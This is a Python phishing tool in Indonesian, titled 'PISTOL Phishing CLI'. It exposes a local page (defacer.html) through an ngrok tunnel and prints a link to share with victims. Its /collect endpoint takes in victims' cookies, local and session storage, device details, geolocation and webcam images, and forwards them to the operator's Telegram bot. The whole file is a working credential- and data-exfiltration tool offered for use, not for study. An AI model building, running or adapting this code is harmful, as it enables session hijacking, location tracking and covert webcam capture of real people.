import subprocess
import requests
import time
import os
import json
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# Konfigurasi
TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""
NGROK_TOKEN = ""
NGROK_URL = ""

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            try:
                with open('defacer.html', 'r') as file:
                    content = file.read()
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(content.encode())
            except Exception as e:
                print(f"Gagal memuat HTML: {e}")
                self.send_response(500)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/collect':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode()
                data = json.loads(post_data)
                
                message = f"""
🔔 Data Baru Diterima [{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] 🔔
Cookies (JSON):
{data['cookies']}
Local Storage (File Structure):
{data['localStorage']}
Session Storage (File Structure):
{data['sessionStorage']}
Device Info (JSON):
{data['deviceInfo']}
Geolocation (JSON):
{data['geolocation']}
Webcam: [Image Data]
"""
                print(f"Data diterima: {message}")  # Log ke CLI
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                    json={"chat_id": TELEGRAM_CHAT_ID, "text": message}
                )
                if data['webcam'] and not data['webcam'].startswith('Gagal'):
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
                        json={"chat_id": TELEGRAM_CHAT_ID, "photo": data['webcam']}
                    )
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'Data diterima')
            except Exception as e:
                print(f"Gagal mengirim ke Telegram: {e}")
                self.send_response(500)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

def setup_ngrok(ngrok_token):
    print("Mengatur Ngrok...")
    try:
        subprocess.run(["ngrok", "authtoken", ngrok_token], capture_output=True, check=True)
        ngrok_process = subprocess.Popen(["ngrok", "http", "8000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(3)
        response = requests.get("http://localhost:4040/api/tunnels")
        global NGROK_URL
        NGROK_URL = response.json()["tunnels"][0]["public_url"]
        print(f"Link Ngrok untuk dibagikan: {NGROK_URL}")
        return ngrok_process
    except Exception as e:
        print(f"Gagal mendapatkan URL Ngrok: {e}")
        return None

def update_html_with_ngrok():
    try:
        with open("defacer.html", "r") as file:
            content = file.read()
        content = content.replace("YOUR_NGROK_URL", NGROK_URL)
        with open("defacer.html", "w") as file:
            file.write(content)
        print("File HTML diperbarui dengan URL Ngrok.")
    except Exception as e:
        print(f"Gagal memperbarui HTML: {e}")

def check_requirements():
    print("Memeriksa dependensi...")
    try:
        subprocess.run(["ngrok", "--version"], capture_output=True, check=True)
        subprocess.run(["python3", "--version"], capture_output=True, check=True)
        print("Semua dependensi terdeteksi.")
        return True
    except Exception as e:
        print(f"Dependensi hilang: {e}")
        return False

def monitor():
    print("Memantau aktivitas... Tekan Ctrl+C untuk menghentikan.")
    while True:
        time.sleep(10)
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Menunggu data masuk...")

if __name__ == "__main__":
    print("🌀PISTOL Phishing CLI🌀")
    if not check_requirements():
        exit(1)
    TELEGRAM_BOT_TOKEN = input("Masukkan Telegram Bot Token: ")
    TELEGRAM_CHAT_ID = input("Masukkan Telegram Chat ID: ")
    NGROK_TOKEN = input("Masukkan Ngrok Auth Token: ")

    ngrok_process = setup_ngrok(NGROK_TOKEN)
    if ngrok_process:
        update_html_with_ngrok()
        try:
            import threading
            server_thread = threading.Thread(target=lambda: HTTPServer(('localhost', 8000), RequestHandler).serve_forever())
            server_thread.daemon = True
            server_thread.start()
            monitor()
        except KeyboardInterrupt:
            print("Menghentikan server dan Ngrok...")
            ngrok_process.terminate()
